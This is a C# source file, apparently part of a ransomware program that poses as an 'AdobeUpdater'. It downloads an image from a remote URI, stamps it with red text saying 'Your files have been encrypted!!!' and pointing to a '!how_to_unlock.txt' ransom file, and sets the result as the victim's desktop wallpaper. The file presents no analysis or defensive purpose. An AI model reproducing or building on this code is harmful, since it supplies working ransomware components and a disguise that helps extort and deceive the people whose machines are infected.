using System;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace AdobeUpdater
{
    public static class Wallpaper
    {
        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public enum Style : int
        {
            Tiled,
            Centered,
            Stretched
        }

        public static void Set(Uri uri, Style style)
        {
            System.IO.Stream s = new System.Net.WebClient().OpenRead(uri.ToString());

            System.Drawing.Image img = System.Drawing.Image.FromStream(s);

            img = DrawText(img);

            string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
            img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Bmp);

            //RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            //if (style == Style.Stretched)
            //{
            //    key.SetValue(@"WallpaperStyle", 2.ToString());
            //    key.SetValue(@"TileWallpaper", 0.ToString());
            //}

            //if (style == Style.Centered)
            //{
            //    key.SetValue(@"WallpaperStyle", 1.ToString());
            //    key.SetValue(@"TileWallpaper", 0.ToString());
            //}

            //if (style == Style.Tiled)
            //{
            //    key.SetValue(@"WallpaperStyle", 1.ToString());
            //    key.SetValue(@"TileWallpaper", 1.ToString());
            //}

            SystemParametersInfo(SPI_SETDESKWALLPAPER,
                0,
                tempPath,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        private static Image DrawText(Image img)
        {
            var font1 = new Font(new FontFamily("Tahoma"), 32);
            var font2 = new Font(new FontFamily("Tahoma"), 24);

            var textColor = Color.Red;

            Graphics drawing = Graphics.FromImage(img);

            //create a brush for the text
            Brush textBrush = new SolidBrush(textColor);

            drawing.DrawString("Your files have been encrypted!!!", font1, textBrush, img.Size.Width / 2 - 200, img.Size.Height / 2);
            drawing.DrawString("Read the file !how_to_unlock.txt on the desktop for more info", font2, textBrush, img.Size.Width / 2 - 200, img.Size.Height / 2 + 200);
            drawing.Save();
            textBrush.Dispose();
            drawing.Dispose();

            return img;
        }
    }
}
